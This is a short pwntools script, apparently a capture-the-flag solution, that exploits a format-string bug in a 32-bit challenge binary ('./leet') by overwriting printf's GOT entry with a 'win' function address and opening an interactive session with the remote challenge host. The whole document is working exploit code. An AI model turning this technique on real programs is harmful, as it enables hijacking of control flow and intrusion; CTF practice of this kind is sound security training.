from pwn import *

context.log_level = "debug"
context.arch = "i386"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./leet"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("host5.metaproblems.com", 5040)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

win =  0x80491f6
print_got = elf.got["printf"]

payload = fmtstr_payload(7, {print_got: p32(win)})
ddebug("break *0x0804947D\n continue")
io.sendlineafter("speakify:\n", payload)

io.interactive()
